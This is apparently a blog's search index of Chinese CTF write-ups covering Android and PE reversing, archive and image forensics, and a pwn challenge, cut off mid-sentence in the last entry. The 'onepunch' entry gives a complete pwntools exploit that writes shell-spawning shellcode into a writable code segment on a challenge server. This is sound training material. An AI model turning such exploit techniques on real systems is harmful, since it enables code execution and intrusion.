<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Bugku-Loopandloop</title>
    <url>/2019/05/13/Bugku-Loopandloop/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/315650.jpg" alt></p><a id="more"></a><ul><li>用JEB或者APK改之理载入后查看java源码。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/5ca5e3b7e0350.png" alt></p><ul><li>MainActivity函数如上。</li><li>程序调用了一个 native 的 chec函数<br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/5ca5e46d49c66.png" alt></li></ul><ul><li>调出apk文件里面的liblhm.so</li><li>用IDA打开 .so文件</li><li>在函数栏里面搜索 chec,双击进入 然后F5进行反编译</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/5ca5e4f81e71f.png" alt></p><ul><li><p>a1,a2 为JNI接口指针和对对象和Java类的引用，是默认的，后两个参数即为Java层参数。</p></li><li><p>以及GetMethodID与CallIntMethod为JNI层调用Java层方法的函数。</p></li><li><p>分析算法得到：</p></li><li><p>当 java层传入的第二个参数 - 1&lt;=0 返回java层的第一个参数</p></li><li><p>else 根据java层第二个参数*2 %3的结果 来判断选择哪个GetMethodID方法。</p></li><li><p>分析 check1 方法 ：每次将第一个参数 加上4950</p></li><li><p>对于check2 方法 ： APK改之理得到的java码与JEB得到的java码不同。并且 APK改之理得到的码略有错误 。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/5ca5e74637fb5.png" alt></p><ul><li><p>以JEB得到的java源码为例</p></li><li><p>如果第二个参数%2 == 0则 第一个参数 +499500 否则 第一个参数 - 499500</p></li><li><p>对于check3方法 第一个参数+49995000</p></li><li><p>对于 验证算法。</p><pre><code>if (MainActivity.this.check(i, 99) == 1835996258)
  {
    localTextView.setText(&quot;The flag is:&quot;);
    paramBundle.setText(&quot;alictf{&quot; + MainActivity.this.stringFromJNI2(i) + &quot;}&quot;);
    return;
  }</code></pre></li><li><p>第一个参数 i 为 我们输入的 数字 第二个参数 固定为 99</p></li><li><p>每个 check系列的函数 最后都会再次返回 chec函数, 再次判断执行哪个check函数,直到第二个参数-1&lt;=0才结束并最终返回第一个参数。</p></li><li><p>鉴于 check 1 、2 、 3三个函数 都对第二个参数没有影响 故可得解密算法如下：</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/5ca5e816b68f8.png" alt></p><ul><li><p>得到运行结果 236492408</p></li><li><p>此值即为输入以后能够得到flag 的 数。</p></li><li><p>方法一： 在模拟器上安装该程序 然后输入 236492408</p></li><li><p>方法二： 分析 JNI2方法 。</p></li><li><p>以方法二为例：</p></li><li><p>IDA载入.so文件 然后 在函数栏搜索JNI2</p></li><li><p>双击进入 F5反编译。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/5ca5e9bc44e72.png" alt></p><ul><li>能力不够 告辞。</li></ul>]]></content>
      <categories>
        <category>安卓逆向</category>
      </categories>
  </entry>
  <entry>
    <title>Bugku-一个普通的压缩包</title>
    <url>/2019/05/13/Bugku-%E4%B8%80%E4%B8%AA%E6%99%AE%E9%80%9A%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/085353-155736323338e0.jpg" alt></p><a id="more"></a><ul><li><p>题目下载下来是一个 zip.rar,打开后发现里面有个flag.txt,打开以后…是 flag is not here</p></li><li><p>所以目标点应该不在这。</p></li><li><p>懒得看文件头啥的了,直接拖入kali,binwalk一下</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190513125212.png" alt></p><ul><li>发现有一个rar文件和一个zip文件。直接foremost分离它们。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foremost zip.rar</span><br></pre></td></tr></table></figure><ul><li><p>分离得到的rar就是原来的那个zip.rar脱去那个zip压缩包后的rar。</p></li><li><p>而zip压缩包里面有一个名为“一个普通的压缩包”的文件夹</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190513125738.png" alt></p><ul><li>文件夹里面是一个flag.rar,打开rar文件以后里面还是flag.txt,内容依旧是flag is not here</li></ul><p><strong>但是值得注意的是: rar文件大小有6kb,但是那个flag.txt只有1kb</strong></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190513125923.png" alt></p><ul><li>用十六进制查看器对这个rar压缩包查看了一番, 发现里面有一个secret.png</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190513130100.png" alt></p><ul><li><p>但是为什么双击打开rar的时候却没显示这个png文件？</p></li><li><p>搜索一番后得知, 这是因为我用的2345解压, 这款软件会自动过滤掉不完整的文件,这个不完整是指缺少rar文件的一些标识。</p></li><li><p>具体知识可以在下面网站中学习。</p></li></ul><p><a href="https://wenku.baidu.com/view/b7889b64783e0912a2162aa4.html" target="_blank" rel="noopener">传送门</a></p><ul><li>回归原始,用winrar打开这个rar压缩包,提示如下</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190513130446.png" alt></p><ul><li><p>所以目标就变成修复这个png文件的文件头。</p></li><li><p>用winrar和2345解压自带的修复功能都没有用… 只能手动了。</p></li><li><p>在flag.txt结束的地方就是下一个块开始的地方,flag.txt结束于 flag is not here的最后一个字母e。 则新块开始于图中A8 3C这个位置。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190513133846.png" alt></p><ul><li>结合文档</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190513134003.png" alt></p><ul><li><p>可知A8 3C就是对应的HEAD_CRC</p></li><li><p>但是HEAD_TYPE却不是0x74而是0x7A,将其改为0x74保存。</p></li><li><p>再次打开rar以后发现了secret.png, 文件总大小也差不多是rar文件的大小了。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190513134132.png" alt></p><ul><li>观察可以发现在十六进制查看其器中 HEAD_TYPE 总是位于该文件CRC32的第三位的上方。这一点可以用来验证,修改的位置是不是HEAD_TYPE。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190513134431.png" alt></p><ul><li>下面对secret.png进行分析</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190513134529.png" alt></p><ul><li>是个gif文件,拓展名改为gif后开始分离</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190513135219.png" alt></p><ul><li>分离得到两张图片, 分别拖入Stegsolve</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190513135329.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190513135345.png" alt></p><ul><li>得到一张下半部分的二维码和一张不完整的上半部分的二维码。补全对应位置得到完整二维码。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190418222353573.jpg" alt></p><ul><li>扫码得到:</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;yanji4n_bu_we1shi&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title>Bugku-QAQ</title>
    <url>/2019/05/16/Bugku-QAQ/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/200846-1509538126fff4.jpg" alt></p><a id="more"></a><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190516205831.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190516205910.png" alt></p><ul><li>下载cipher.txt里面的内容为:</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FSAnRAIzNlMjPQMjNyBJNTs6NlIFPFIqDDVTJy0zGE8rKxZBJDIrJkYoPUQML1M3MDYJZTElFyI7</span><br><span class="line">UzE6DTtSNxckNDw2Mxk9Jzc=</span><br></pre></td></tr></table></figure><ul><li><p>是一段base64,但是解码以后是乱码。</p></li><li><p>QAQ文件用十六进制查看器打开后发现了.py, <strong>main</strong> 之类的关键词，一看就是个pyc文件,拓展名改为pyc文件后进行反编译。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190516210331.png" alt></p><ul><li><p>用在线工具进行反编译的话, 提示有部分代码没有反编译成功, 并且在没有反编译成功的地方加了注释告诉我们这个位置有没有反编译成功的代码。</p></li><li><p>转变方向,追求更高效的反编译方法。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190516210413.png" alt></p><ul><li>在网上得知了一款名为uncompyle6的工具。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190516210538.png" alt></p><ul><li>由此反编译得到了完整的py代码。<br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190516210604.png" alt></li></ul><ul><li>针对这个文件写了一个解密脚本 decode.py</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(key, plain)</span>:</span></span><br><span class="line">    cipher = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain)):</span><br><span class="line">        cipher += chr(ord(key[(i % len(key))]) ^ ord(plain[i]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPlainText</span><span class="params">()</span>:</span></span><br><span class="line">    plain = <span class="string">''</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'cipher.txt'</span>) <span class="keyword">as</span> (f):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            line = f.readline()</span><br><span class="line">            <span class="keyword">if</span> line:</span><br><span class="line">                plain += line</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> plain.decode(<span class="string">'base_64'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    key = <span class="string">'LordCasser'</span></span><br><span class="line">    plain = getPlainText()</span><br><span class="line">    cipher = decrypt(key, plain)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'plain.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> (f):</span><br><span class="line">        f.write(cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><ul><li>如果用编译器运行该脚本的话,需要把 open(‘cipher.txt’) 这种变成 open(‘绝对路径’)这种形式。</li><li>如果不是编译器,需要保证.py脚本与脚本中用到的文件在同一路径。如图。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190516214339.png" alt></p><ul><li>运行脚本得到 plain.txt,内容为:</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">YOU ARE FOOLED</span><br><span class="line">THIS IS NOT THAT YOU WANT</span><br><span class="line">GO ON DUDE</span><br><span class="line">CATCH THAT STEGOSAURUS</span><br></pre></td></tr></table></figure><ul><li>根据提示, 百度搜了搜那个STEGOSAURUS…结果…</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190516214547.png" alt></p><ul><li><p>剑龙…???</p></li><li><p>应该不会是让我们去抓住那个剑龙…</p></li><li><p>谷歌一番,找到了这个</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190516214812.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190516214835.png" alt></p><ul><li>看不太懂, 翻译一波</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190516220140.png" alt></p><ul><li>链接在这。</li></ul><p><a href="https://bitbucket.org/jherron/stegosaurus/src/default/" target="_blank" rel="noopener">传送门</a></p><ul><li>所以这个应该是一种工具。搞下来以后根据用法来用。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190516215314.png" alt></p><ul><li><p>欺负我Windows上只安了python2.7.15…..</p></li><li><p>无奈打开kali,因为我kali安python3了…</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190516215550.png" alt></p><ul><li>得到flag</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;fin4lly_z3r0_d34d&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title>Bugku-神秘的文件</title>
    <url>/2019/05/09/Bugku-%E7%A5%9E%E7%A7%98%E7%9A%84%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/315855.jpg" alt></p><a id="more"></a><ul><li><p>这道题做了有一段时间了,今天拿出来复现了一下, 发现这个题可以用明文攻击来解。</p></li><li><p>当时直接暴力破解的…</p></li><li><p>但是 今天明文攻击出了点小问题,特地记录一下。</p></li><li><p>起初用的2345压缩 对 logo.png进行压缩的,但是这样总提示我一些错误…</p></li><li><p>在网上搜了一番明文攻击的知识以后, 换了winrar压缩(压缩成zip格式)以后明文攻击就可以正常进行了。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190509203047.png" alt></p><ul><li>解出来密码以后就剩doc隐写了…没啥好说的了。</li></ul>]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title>HelloWorld</title>
    <url>/2019/04/25/HelloWorld/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/313134.jpg" alt></p><a id="more"></a><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=33856223&auto=1&height=66"></iframe><ul><li>Hello,world!</li><li>这是我的第一篇博客。</li><li>打算在博客里面更一些文章,比如学习记录、CTF的WP之类的。</li><li>之前好些CTF题目都过去了, 没写WP…今后做了的题目,如果值得写WP, 那我会写在博客里面。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/tgs.jpg" alt></p>]]></content>
  </entry>
  <entry>
    <title>[Hackme.inndy] onepunch</title>
    <url>/2020/03/11/Hackme-inndy-onepunch/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/49046439_p0.png" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这道题目是在BUU上面看到的，原本是台湾的一个pwn练习平台hackme.inndy的题目，之前做了几道inndy的题目，感觉难度不大但是挺涨知识的。</p><p>这道题难度不算大，写这篇博客是为了记录一些骚姿势。</p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure><p>主函数如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Where What?"</span>, <span class="number">0L</span>L);</span><br><span class="line">  v5 = __isoc99_scanf(<span class="string">"%llx %d"</span>, &amp;v6, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  *v6 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">255</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No flag for you"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个很可疑的函数，名字是个下划线，执行的是mprotect函数，不过这次没用到它。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 _()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">10L</span>L;</span><br><span class="line">  __asm &#123; syscall; LINUX - sys_mprotect &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.text:<span class="number">00000000004006</span>C6 _               proc near               ; DATA XREF: .init_array:<span class="number">0000000000600E10</span>↓o</span><br><span class="line">.text:<span class="number">00000000004006</span>C6 ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000004006</span>C6                 push    rbp</span><br><span class="line">.text:<span class="number">00000000004006</span>C7                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">00000000004006</span>CA                 lea     rdi, loc_4006D1</span><br><span class="line">.text:<span class="number">00000000004006</span>D1</span><br><span class="line">.text:<span class="number">00000000004006</span>D1 loc_4006D1:                             ; DATA XREF: _+<span class="number">4</span>↑o</span><br><span class="line">.text:<span class="number">00000000004006</span>D1                 <span class="keyword">and</span>     rdi, <span class="number">0F</span>FFFFFFFFFFFF000h ; start</span><br><span class="line">.text:<span class="number">00000000004006</span>D8                 mov     rsi, <span class="number">1000</span>h      ; len</span><br><span class="line">.text:<span class="number">00000000004006</span>DF                 mov     rdx, <span class="number">7</span>          ; prot</span><br><span class="line">.text:<span class="number">00000000004006E6</span>                 mov     rax, <span class="number">0</span>Ah</span><br><span class="line">.text:<span class="number">00000000004006</span>ED                 syscall                 ; LINUX - sys_mprotect</span><br><span class="line">.text:<span class="number">00000000004006</span>EF                 nop</span><br><span class="line">.text:<span class="number">00000000004006F</span>0                 pop     rbp</span><br><span class="line">.text:<span class="number">00000000004006F</span>1                 retn</span><br><span class="line">.text:<span class="number">00000000004006F</span>1 ; &#125; <span class="comment">// starts at 4006C6</span></span><br><span class="line">.text:<span class="number">00000000004006F</span>1 _               endp</span><br></pre></td></tr></table></figure><p>根据main函数，我们会读入一个16进制的数到v6，然后读入一个10进制的数到v4，然后通过<code>*v6 = v4;</code>向16进制数的地址中写入这个10进制数，但由于前面是<code>_BYTE *v6;</code>，所以我们只能写入一个字节。</p><p><strong>程序存在任意地址写的漏洞，但是只能使用一次，有什么办法能让这个漏洞多次被使用呢？</strong></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200311013422.png" alt></p><p>可以看到0x400000 - 0x401000 的代码段的权限是rwxp，也就是说这个程序的代码段可写！</p><p>接着看main函数的汇编</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200311013844.png" alt></p><p>可以看到程序在判断完v4是否为255以后会有一个jnz跳转，这个在伪代码界面是不显示的，不过可以利用这个修改跳转的目的地来实现多次任意地址写。</p><p>有了<code>多次任意地址写</code>、<code>代码段任意地址跳转</code>并且<code>代码段可写</code>，我们就可以像打着patch做题一样了，可以往代码段写入shellcode然后跳转到shellcode来执行了。</p><h1 id="0x02-Let’s-do-it！"><a href="#0x02-Let’s-do-it！" class="headerlink" title="0x02 Let’s do it！"></a>0x02 Let’s do it！</h1><h2 id="首先通过修改跳转的目的地来实现多次利用任意地址写漏洞"><a href="#首先通过修改跳转的目的地来实现多次利用任意地址写漏洞" class="headerlink" title="首先通过修改跳转的目的地来实现多次利用任意地址写漏洞"></a><strong>首先通过修改跳转的目的地来实现多次利用任意地址写漏洞</strong></h2><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200311021246.png" alt></p><p>在IDA中将这个地方改成4或者5就能看到汇编对应的机器码。</p><p>然后来到刚才提到的<code>.text:0000000000400767 75 0A jnz short loc_400773</code></p><p>其中<code>\x75</code>是<code>jnz</code>的机器码，<code>\x0A</code>是跳转地址的偏移。</p><p>我们先选定一个跳转目的地。</p><p>这里选取了<code>0x40071D mov edi, offset format ; &quot;Where What?&quot;</code></p><p>然后按下<code>N</code>，给他rename一下，这里就改成<code>loc_40071D</code>吧。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/image-20200311021816441.png" alt></p><p>确定以后可以观察到如下形式</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200311021916.png" alt></p><p>然后来到刚刚那个<code>0x400767</code>这个地方进行<code>keypatch</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200311022050.png" alt></p><p>将其改成<code>jnz loc_40071D</code>,就可以看到机器码由原来的<code>75 0A</code>变成了<code>75 B4</code>。</p><p>这也就说明如果我们通过程序原本的一次任意地址写，将这个0A改成B4就能实现多次任意地址写。</p><p>而这个<code>0A</code>在<code>0x400768</code>的位置，实现起来就简单了！</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c.recvuntil(<span class="string">'Where What?'</span>)</span><br><span class="line">c.sendline(<span class="string">'0x400768'</span>)</span><br><span class="line">c.sendline(<span class="string">'180'</span>)<span class="comment">#0xB4 == 180</span></span><br></pre></td></tr></table></figure><h2 id="向代码段写入shellcode"><a href="#向代码段写入shellcode" class="headerlink" title="向代码段写入shellcode"></a>向代码段写入shellcode</h2><p>我选的<code>shellcode_addr = 0x400769</code>，因为这块地方很容易触发，只需要让输入的十进制数为0XFF就可以。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context(log_level = <span class="string">'debug'</span>,arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line">sc_addr = <span class="number">0x400769</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shellcode)):</span><br><span class="line">    c.recvuntil(<span class="string">'Where What?'</span>)</span><br><span class="line">    c.sendline(str(hex(sc_addr+i)))</span><br><span class="line">    c.sendline(str(ord(shellcode[i])))</span><br></pre></td></tr></table></figure><p><strong>这里有个细节</strong></p><p>我们需要保证shellcode里面不存在<code>\xff</code>，因为程序会有验证输入的十进制数是否等于<code>0xff</code>！</p><p>比较幸运的是，这么生成的shellcode不含有<code>\xff</code></p><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c.sendline(<span class="string">'0x400000'</span>)</span><br><span class="line">c.sendline(<span class="string">'255'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>向随便一个地方写入个255就能触发程序走向0x400769,也就是我们的shellcode的位置。</p><h1 id="0x03-完整EXP"><a href="#0x03-完整EXP" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>,arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#c = process('./onepunch')</span></span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26043</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Where What?'</span>)</span><br><span class="line">c.sendline(<span class="string">'0x400768'</span>)</span><br><span class="line">c.sendline(<span class="string">'180'</span>)<span class="comment">#0xB4 == 180</span></span><br><span class="line"></span><br><span class="line">sc_addr = <span class="number">0x400769</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shellcode)):</span><br><span class="line">    c.recvuntil(<span class="string">'Where What?'</span>)</span><br><span class="line">    c.sendline(str(hex(sc_addr+i)))</span><br><span class="line">    c.sendline(str(ord(shellcode[i])))</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'0x400000'</span>)</span><br><span class="line">c.sendline(<span class="string">'255'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://carlstar.club/2018/11/06/onepunch/#%E6%80%9D%E8%B7%AF" target="_blank" rel="noopener">传送门</a></p><p><a href="https://xz.aliyun.com/t/3700#toc-10" target="_blank" rel="noopener">先知社区</a></p><p><a href="https://blog.csdn.net/charlie_heng/article/details/78941701" target="_blank" rel="noopener">CSDN</a></p><p>感谢各位师傅们的博客</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/79742165_p0.png" alt></p>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>JCTF-逆向</title>
    <url>/2019/05/21/JCTF-%E9%80%86%E5%90%91/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/091633-15052653935db5.jpg" alt></p><a id="more"></a><h1 id="re100"><a href="#re100" class="headerlink" title="re100"></a>re100</h1><ul><li>下载下来并没有拓展名, 查看16进制发现是个apk文件。</li><li>拖入JEB或者APK改之理。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190521212534.png" alt></p><ul><li><p>还有一部分没截到,根据题意, 一个字符串要先经过 MD5 加密, 然后将得到的MD5值进行base64加密, 如果与下面这一串相等则正确。</p><blockquote><p>NzU2ZDJmYzg0ZDA3YTM1NmM4ZjY4ZjcxZmU3NmUxODk=</p></blockquote></li><li><p>上面的字符串进行base64解密得到</p></li></ul><blockquote><p>756d2fc84d07a356c8f68f71fe76e189</p></blockquote><ul><li><p>曾经想过正向爆破…</p></li><li><p>但是正向爆破需要的时间…太多太多,而且不知道flag有多少位。</p></li><li><p>在线解密得到:</p></li></ul><blockquote><p>}321nimda{galflj</p></blockquote><ul><li>反过来就是flag了</li></ul><blockquote><p>jlflag{admin123}</p></blockquote><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/173806-1498469886e870.jpg" alt></p><h1 id="re200"><a href="#re200" class="headerlink" title="re200"></a>re200</h1><ul><li><p>查看16进制 文件头为 4D 5A,为exe文件的文件头</p></li><li><p>但是…</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190521213503.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190521213902.png" alt></p><ul><li>而且载入IDA也没啥效果, 而且没法载入OD。</li><li>WP说是文件头有损坏, 那么下面的任务就是修复PE文件头了。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190521214651.png" alt></p><ul><li>位于 30h,c位置 的E9 为e_lfanew字段, 这个字段指明了PE文件头在文件中的位置</li><li>PE文件头为50 45 00 00</li><li>显然 E9 指向的位置不对, 应该指向50才对,所以需要将E8改为E9</li><li>再将ff改为00</li><li>保存, 强迫症… 加个拓展名.exe</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190521215124.png" alt></p><ul><li><p>这下正常显示了。</p></li><li><p>拖入IDA, 一堆C++伪代码, 看着有点恶心。迷迷糊糊按着WP写了个破解算法。<br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190521231028.png" alt></p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190521231052.png" alt></p><ul><li>起初写的python算法, 然后发现,执行效率低得感人…</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190521225922.png" alt></p><ul><li>具体效率能有多低, 